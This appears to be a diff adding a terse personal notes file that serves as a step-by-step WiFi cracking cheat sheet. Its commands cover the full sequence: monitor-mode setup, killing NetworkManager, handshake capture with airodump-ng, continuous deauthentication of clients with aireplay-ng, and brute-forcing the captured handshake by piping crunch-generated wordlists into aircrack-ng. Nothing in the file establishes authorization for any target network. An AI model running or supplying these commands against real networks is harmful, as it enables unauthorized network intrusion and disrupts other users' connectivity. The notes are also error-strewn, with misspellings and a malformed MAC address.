@@ -1,0 +1,43 @@
+1)
+	apt-get update
+	apt-get upgade
+
+2)
+	cranch
+		google_search -> crunch password generator
+
+		download and install
+						(cd ./download/cranch -> make install)
+			help ->  man crunch
+
+			crunch 3 5 abcd123 | aircrack-ng
+
+			crunch 3 5 abcd123 | aircrack-ng -w -
+
+scan Net
+	ifconfig -a
+	iwlist wlan0 scan | grep ESSID
+
+down
+	ifconfig wlan0 down
+	iwconfig wlan0 mode monitor
+	ifconfig wlan0 up
+
+air
+	see all
+		airmon-ng check wlan0
+		1) kill NetworkManager
+			kill 1312 (reapet airmon-ng check wlan0)
+
+	chang siid
+		airodump-ng wlan0
+		airodump-ng -c <canal> -w SCAN_My_wifi --bssid <MAC> wlan0
+		airodump-ng -c 7 -w FILE_NAME --bssid 3r:2e:u3:u5 wlan0
+
+	doss-hi
+		aireplay-ng -0 0 -a <MAC> wlan0
+
+	logistic
+		aircrack-ng -w [word_list]
+		crunch 3 5 abcd123 | aircrack-ng -w - file_name.cap -e siid_name
+		crunch -F | aircrack-ng -w - file_name.cap -e siid_name
